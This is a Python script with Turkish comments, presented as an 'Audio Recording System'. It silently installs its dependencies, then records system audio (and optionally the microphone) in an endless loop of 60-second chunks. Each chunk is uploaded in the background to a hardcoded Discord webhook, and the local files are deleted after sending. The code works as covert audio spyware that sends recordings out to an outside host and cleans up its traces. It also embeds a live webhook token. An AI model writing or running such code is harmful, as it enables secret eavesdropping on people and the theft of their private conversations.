import os
import sys
import time
import threading
import traceback
import logging
import subprocess
from datetime import datetime
import glob  # Dosya kalıpları için eklendi

# Öncelikle gerekli modüllerin kurulu olup olmadığını kontrol edelim
def ensure_module(module_name):
    """Gerekli modülün yüklü olduğundan emin ol, değilse yüklemeyi dene"""
    try:
        __import__(module_name)
        print(f"Module {module_name} is already installed.")
        return True
    except ImportError:
        print(f"Module {module_name} is not installed. Attempting to install...")
        try:
            # pip hatalarını görmek istiyorsanız, stdout ve stderr parametrelerini kaldırabilirsiniz
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", module_name],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"Successfully installed {module_name}")
            return True
        except Exception as e:
            print(f"Failed to install {module_name}: {e}")
            return False

# Gerekli modülleri kontrol et ve eksik olanları kur
print("Checking required modules...")
for module in ['requests', 'soundcard', 'soundfile', 'pyaudio', 'pydub', 'numpy', 'psutil']:
    ensure_module(module)

# Global olarak modülleri import et
import requests
import numpy as np
import psutil

# Ses işleme kütüphanelerini import et - hata olursa işlemi devam ettir
try:
    import soundcard as sc
except ImportError as e:
    print(f"WARNING: Failed to import soundcard: {e}")

try:
    import soundfile as sf
except ImportError as e:
    print(f"WARNING: Failed to import soundfile: {e}")

# Önemli: pydub'ı global olarak import ediyoruz
try:
    from pydub import AudioSegment
    PYDUB_AVAILABLE = True
except ImportError as e:
    print(f"WARNING: Failed to import pydub: {e}")
    PYDUB_AVAILABLE = False

# 'pyaudioop' C modülü normalde gerekli değil, pydub işlem yaparken kullanılabilir
# ama pydub zaten doğru şekilde kurulduğunda gerekirse yönetecektir
print("NOTE: Not attempting to import pyaudioop as it's not directly needed.")

# Log ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("audio_record.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AudioRecordingSystem")

# Yapılandırmayı yükle
def load_config():
    """config_audio.py dosyasından yapılandırmayı yükleme"""
    config = {
        # Varsayılan değerler
        "DEFAULT_RECORDING_DURATION": 60,
        "SAMPLE_RATE": 22050,
        "MP3_BITRATE": 32,
        "BIT_DEPTH": 16,
        "COMPRESS_AUDIO": True,
        "SEND_MIXED_AUDIO": False,
        "SEND_MIC_AUDIO": False,
        "SEND_SYSTEM_AUDIO": True,
        "AUDIO_WEBHOOK_URL": "https://discord.com/api/webhooks/1345212795515568138/_Owji5OJk2p9MzNX3gaIZJ5wZfItA3NTllHW16ee5g9zzEv7wK2E76vlFE3qbOITwRIs"
    }
    
    # config_audio.py'den ayarları yüklemeyi dene
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        sys.path.insert(0, script_dir)
        import config_audio
        logger.info("Found config_audio.py, loading settings...")
        
        # Yapılandırma değişkenlerini aktar
        for attr in dir(config_audio):
            if attr.isupper():  # Sadece büyük harfli (sabit) değişkenleri al
                config[attr] = getattr(config_audio, attr)
                logger.info(f"Loaded setting {attr} = {getattr(config_audio, attr)}")
    except ImportError as e:
        logger.warning(f"Error loading config_audio.py: {e}")
        logger.info("Using default settings")
    
    return config

def send_to_discord_async(file_path, config, label="Audio"):
    """Discord'a ses dosyasını arka planda gönderen fonksiyon - etiketleme özelliği ile"""
    def _send_and_cleanup():
        try:
            logger.info(f"[BACKGROUND] Sending {label} file to Discord: {file_path}")
            
            if not os.path.exists(file_path):
                logger.error(f"File does not exist: {file_path}")
                return
            
            # Dosyayı güvenli şekilde kopyalayarak işlem
            tmp_copy = None
            try:
                # Dosyayı geçici bir kopyaya kopyalayalım, böylece orijinal dosya üzerindeki kilitleme sorunlarından kaçınırız
                tmp_copy = f"{file_path}.tmp"
                with open(file_path, 'rb') as src_file:
                    with open(tmp_copy, 'wb') as dst_file:
                        dst_file.write(src_file.read())
                
                # Geçici kopya ile Discord'a gönder
                with open(tmp_copy, 'rb') as f:
                    files = {
                        'file': (os.path.basename(file_path), f, 'audio/mpeg' if file_path.endswith('.mp3') else 'audio/wav')
                    }
                    
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    payload = {
                        # Önceki sabit "SYSTEM AUDIO" yerine gönderilen etiketi kullan
                        'content': f"**{label}:** Recording taken at {timestamp}"
                    }
                    
                    response = requests.post(
                        config["AUDIO_WEBHOOK_URL"],
                        data=payload, 
                        files=files,
                        timeout=60
                    )
                    
                    if response.status_code in [200, 204]:
                        logger.info(f"[BACKGROUND] Audio file sent to Discord successfully: {file_path}")
                    else:
                        logger.error(f"[BACKGROUND] Failed to send to Discord. Status: {response.status_code}")
                        return
            
            except Exception as e:
                logger.error(f"[BACKGROUND] Error during file copy or upload: {e}")
                return
            
            # Başarılı gönderimden sonra 1 saniye bekle ve dosyaları temizle
            time.sleep(1)
            
            # Orijinal dosyayı ve geçici kopyayı temizle - birkaç deneme yap 
            for _ in range(3):
                try:
                    # Önce geçici kopya
                    if tmp_copy and os.path.exists(tmp_copy):
                        os.remove(tmp_copy)
                        
                    # Şimdi orijinal dosya
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        logger.info(f"[BACKGROUND] Deleted file after sending: {file_path}")
                        break
                except Exception as e:
                    logger.warning(f"[BACKGROUND] Attempt to delete file failed, will retry: {e}")
                    time.sleep(1)  # Biraz bekle ve tekrar dene
            
        except Exception as e:
            logger.error(f"[BACKGROUND] Error in async upload: {e}")
            # Son temizlik denemesi
            try:
                if tmp_copy and os.path.exists(tmp_copy):
                    os.remove(tmp_copy)
            except:
                pass
    
    # Arka plan thread'i başlat
    upload_thread = threading.Thread(target=_send_and_cleanup)
    upload_thread.daemon = True  # Ana uygulama kapanırsa thread de kapanır
    upload_thread.start()
    logger.info(f"Started background upload for file: {file_path}")
    return True

def record_audio(config, duration=60):
    """Ses kaydı yapma fonksiyonu - hem mikrofon hem de sistem sesi kaydetme desteğiyle"""
    logger.info(f"Recording audio for {duration} seconds...")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(script_dir, f"audio_{timestamp}.mp3")
    
    try:
        # Mikrofon ve sistem seslerini ayrı ayrı kaydet, sonra birleştir
        mic_data = None
        system_data = None
        
        # Kayıt için hazırlık
        sample_rate = config["SAMPLE_RATE"]
        num_frames = int(sample_rate * duration)
        
        # Eğer karışık ses veya mikrofon sesi isteniyorsa mikrofon kaydı yap
        if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_MIC_AUDIO", False):
            try:
                # Varsayılan mikrofonu seç
                default_mic = sc.default_microphone()
                if default_mic:
                    logger.info(f"Recording from microphone: {default_mic.name}")
                    with default_mic.recorder(samplerate=sample_rate) as mic_recorder:
                        mic_data = mic_recorder.record(numframes=num_frames)
                        logger.info("Microphone recording completed")
            except Exception as e:
                logger.error(f"Failed to record from microphone: {e}")
        
        # Eğer karışık ses veya sistem sesi isteniyorsa sistem sesi kaydı yap
        if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_SYSTEM_AUDIO", False):
            try:
                # Sistem sesini kaydet (loopback)
                speaker = sc.default_speaker()
                loopback_mic = sc.get_microphone(id=speaker.id, include_loopback=True)
                
                logger.info(f"Recording system audio from: {loopback_mic.name}")
                with loopback_mic.recorder(samplerate=sample_rate) as system_recorder:
                    system_data = system_recorder.record(numframes=num_frames)
                    logger.info("System audio recording completed")
            except Exception as e:
                logger.error(f"Failed to record system audio: {e}")
        
        # İşlenecek ses verilerini kontrol et
        if mic_data is None and system_data is None:
            logger.error("Failed to record any audio")
            return False
        
        # Gereken dosya yollarını hazırla
        temp_mixed_wav = os.path.join(script_dir, f"temp_mixed_{timestamp}.wav")
        temp_mic_wav = os.path.join(script_dir, f"temp_mic_{timestamp}.wav") if mic_data is not None else None
        temp_system_wav = os.path.join(script_dir, f"temp_system_{timestamp}.wav") if system_data is not None else None
        
        # Karışık ses oluştur (eğer hem mikrofon hem de sistem sesi varsa)
        mixed_data = None
        if mic_data is not None and system_data is not None and config.get("SEND_MIXED_AUDIO", False):
            try:
                # Ses verilerinin boyutlarını kontrol et
                if len(mic_data) != len(system_data):
                    # Aynı uzunlukta değillerse kısalt
                    min_length = min(len(mic_data), len(system_data))
                    mic_data = mic_data[:min_length]
                    system_data = system_data[:min_length]
                
                # Seslerin kanal sayısını kontrol et
                mic_channels = mic_data.shape[1] if len(mic_data.shape) > 1 else 1
                sys_channels = system_data.shape[1] if len(system_data.shape) > 1 else 1
                
                # Tek kanallı ses için şekil düzeltme
                if len(mic_data.shape) == 1:
                    mic_data = mic_data.reshape(-1, 1)
                if len(system_data.shape) == 1:
                    system_data = system_data.reshape(-1, 1)
                
                # Mikrofon ses seviyesini ayarla
                mic_boost = float(config.get("MIC_BOOST", 2.0))
                system_volume = float(config.get("SYSTEM_AUDIO_VOLUME", 0.6))
                
                # Karıştırma işlemi
                mic_boosted = mic_data * mic_boost
                system_adjusted = system_data * system_volume
                mixed_data = mic_boosted + system_adjusted
                
                # Olası clipping'i önlemek için normalizasyon
                if config.get("NORMALIZE_AUDIO", True):
                    max_value = np.max(np.abs(mixed_data))
                    if max_value > 0.95:  # Clipping'e yakınsa
                        mixed_data = mixed_data / max_value * 0.95  # %95 seviyesine normalleştir
                
                # Karışık sesi WAV olarak kaydet
                sf.write(temp_mixed_wav, mixed_data, sample_rate)
                logger.info(f"Created mixed audio file: {temp_mixed_wav}")
                
            except Exception as e:
                logger.error(f"Error mixing audio: {e}")
                mixed_data = None
        
        # Mikrofon sesini kaydet (isteniyorsa)
        if mic_data is not None and config.get("SEND_MIC_AUDIO", False):
            try:
                sf.write(temp_mic_wav, mic_data, sample_rate)
                logger.info(f"Saved microphone audio to: {temp_mic_wav}")
            except Exception as e:
                logger.error(f"Error saving microphone audio: {e}")
                temp_mic_wav = None
        
        # Sistem sesini kaydet (isteniyorsa)
        if system_data is not None and config.get("SEND_SYSTEM_AUDIO", False):
            try:
                sf.write(temp_system_wav, system_data, sample_rate)
                logger.info(f"Saved system audio to: {temp_system_wav}")
            except Exception as e:
                logger.error(f"Error saving system audio: {e}")
                temp_system_wav = None
        
        # Sıkıştırma işlemi - MP3 dönüşümü
        mp3_files = []
        
        # Karışık ses için MP3 dönüşümü
        if config.get("COMPRESS_AUDIO", True) and PYDUB_AVAILABLE:
            try:
                # Karışık ses MP3
                if temp_mixed_wav and os.path.exists(temp_mixed_wav):
                    mixed_mp3 = os.path.join(script_dir, f"mixed_{timestamp}.mp3")
                    audio = AudioSegment.from_wav(temp_mixed_wav)
                    audio.export(mixed_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                    logger.info(f"Converted mixed audio to MP3: {mixed_mp3}")
                    mp3_files.append(("mixed", mixed_mp3))
                    
                # Mikrofon MP3
                if temp_mic_wav and os.path.exists(temp_mic_wav):
                    mic_mp3 = os.path.join(script_dir, f"mic_{timestamp}.mp3")
                    audio = AudioSegment.from_wav(temp_mic_wav)
                    audio.export(mic_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                    logger.info(f"Converted microphone audio to MP3: {mic_mp3}")
                    mp3_files.append(("mic", mic_mp3))
                    
                # Sistem MP3
                if temp_system_wav and os.path.exists(temp_system_wav):
                    system_mp3 = os.path.join(script_dir, f"system_{timestamp}.mp3")
                    audio = AudioSegment.from_wav(temp_system_wav)
                    audio.export(system_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                    logger.info(f"Converted system audio to MP3: {system_mp3}")
                    mp3_files.append(("system", system_mp3))
            except Exception as e:
                logger.error(f"Error converting to MP3: {e}")
        
        # Discord'a gönderim işlemi
        files_to_send = []
        
        # Eğer MP3 dönüşümü başarılı olduysa MP3 dosyaları, değilse WAV dosyaları gönder
        if mp3_files:
            for audio_type, file_path in mp3_files:
                if audio_type == "mixed" and config.get("SEND_MIXED_AUDIO", False):
                    # "Mixed Audio" etiketi ile gönder
                    files_to_send.append(("Mixed Audio", file_path))
                elif audio_type == "mic" and config.get("SEND_MIC_AUDIO", False):
                    # "Microphone Audio" etiketi ile gönder
                    files_to_send.append(("Microphone Audio", file_path))
                elif audio_type == "system" and config.get("SEND_SYSTEM_AUDIO", False):
                    # "System Audio" etiketi ile gönder
                    files_to_send.append(("System Audio", file_path))
        else:
            # MP3 dönüşümü başarısız oldu, WAV dosyalarını gönder
            if temp_mixed_wav and os.path.exists(temp_mixed_wav) and config.get("SEND_MIXED_AUDIO", False):
                files_to_send.append(("Mixed Audio", temp_mixed_wav))
            if temp_mic_wav and os.path.exists(temp_mic_wav) and config.get("SEND_MIC_AUDIO", False):
                files_to_send.append(("Microphone Audio", temp_mic_wav))
            if temp_system_wav and os.path.exists(temp_system_wav) and config.get("SEND_SYSTEM_AUDIO", False):
                files_to_send.append(("System Audio", temp_system_wav))
        
        # Discord'a gönder - burada etiket değişkenini doğru şekilde kullanmayı sağla
        for label, file_path in files_to_send:
            logger.info(f"Sending {label} to Discord: {file_path}")
            # Etiket parametresini doğru bir şekilde geçir
            send_to_discord_async(file_path, config, label)
        
        # Tüm geçici dosyaları temizle - arka plandaki gönderin işlemi kopyaları kullanacak
        try:
            # WAV dosyalarını hemen temizle
            for wav_file in [temp_mixed_wav, temp_mic_wav, temp_system_wav]:
                if wav_file and os.path.exists(wav_file):
                    try:
                        os.remove(wav_file)
                        logger.debug(f"Removed temporary WAV file: {wav_file}")
                    except:
                        pass
        except Exception as e:
            logger.debug(f"Error cleaning up temporary files: {e}")
        
        return True if files_to_send else False
        
    except Exception as e:
        logger.error(f"Recording failed: {e}")
        traceback.print_exc()
        return False

def continuous_recording():
    """Sürekli kayıt fonksiyonu - yeni arayüz ile bekleme olmadan"""
    logger.info("Starting continuous audio recording")
    config = load_config()
    
    # Aktif kayıt sayacı
    active_recordings = 0
    max_parallel = 2  # Aynı anda en fazla 2 kayıt işlemi olabilir (güvenlik için)
    
    while True:
        try:
            # Kayıt işlemini başlat
            logger.info("Starting new recording cycle immediately")
            success = record_audio(config, config["DEFAULT_RECORDING_DURATION"])
            
            if success:
                logger.info("Recording cycle completed successfully, continuing without delay")
            else:
                logger.warning("Recording cycle had some issues, continuing anyway")
                
                # Sadece hata durumunda kısa bir bekleme ekle (sistemin durmasını engellemek için)
                logger.info("Waiting 5 seconds after error before trying again")
                time.sleep(5)
            
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received. Stopping recording.")
            break
        except Exception as e:
            logger.error(f"Error in continuous recording: {e}")
            traceback.print_exc()
            # Hata durumunda biraz bekle, sistemin aşırı yüklenmesini engelle
            logger.info("Waiting 10 seconds after exception before continuing")
            time.sleep(10)

def reset_imports():
    """Modülleri tekrar yüklemeyi dener"""
    try:
        # Ses işleme modüllerini yeniden yüklemeyi dene
        global PYDUB_AVAILABLE
        
        # pydub modülünü tekrar yüklemeye çalış
        try:
            if 'pydub' in sys.modules:
                del sys.modules['pydub']
            
            from pydub import AudioSegment
            logger.info("Successfully reloaded pydub module")
            PYDUB_AVAILABLE = True
        except ImportError as e:
            logger.error(f"Failed to reload pydub: {e}")
            PYDUB_AVAILABLE = False
        
        return True
    except Exception as e:
        logger.error(f"Error resetting imports: {e}")
        return False

if __name__ == "__main__":
    print("=" * 50)
    print("AUDIO RECORDING SYSTEM STARTING")
    print("=" * 50)
    
    # Başlangıç bilgisi göster
    logger.info("Audio Recording System starting...")
    logger.info(f"Python version: {sys.version}")
    logger.info(f"Working directory: {os.getcwd()}")
    
    # pydub kullanılabilirliğini kontrol et
    if not PYDUB_AVAILABLE:
        logger.warning("pydub is not available. Will attempt to reinstall.")
        # pyaudioop ve pydub modüllerini kurma denemesi
        try:
            # Önce pydub'ı kaldır
            subprocess.check_call([sys.executable, "-m", "pip", "uninstall", "-y", "pydub"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Gerekirse PyAudio'yu yeniden yüklemeyi dene (pyaudioop bazen bu modülle gelir)
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "--upgrade", "PyAudio"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Şimdi pydub'ı yükle
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "pydub"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Yeniden import etmeyi dene
            reset_imports()
            
            # pyaudioop olmadan çalışma seçeneğini ekleyelim
            if not PYDUB_AVAILABLE:
                logger.warning("Still couldn't import pydub, will continue without MP3 compression")
        except Exception as e:
            logger.error(f"Error reinstalling audio modules: {e}")
    
    # Başlangıçta eski ses dosyalarını temizleme
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        for pattern in ['*.wav', '*.tmp', '*.mp3']:
            for file_path in glob.glob(os.path.join(script_dir, pattern)):
                try:
                    # Dosya yaşını kontrol et - 1 saatten eski dosyaları temizle
                    file_age = time.time() - os.path.getmtime(file_path)
                    if file_age > 3600:  # 1 saat
                        os.remove(file_path)
                        logger.info(f"Cleaned up old file: {file_path}")
                except Exception as e:
                    logger.warning(f"Could not clean up file {file_path}: {e}")
    except Exception as e:
        logger.warning(f"Error during initial cleanup: {e}")
    
    try:
        continuous_recording()
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        traceback.print_exc()
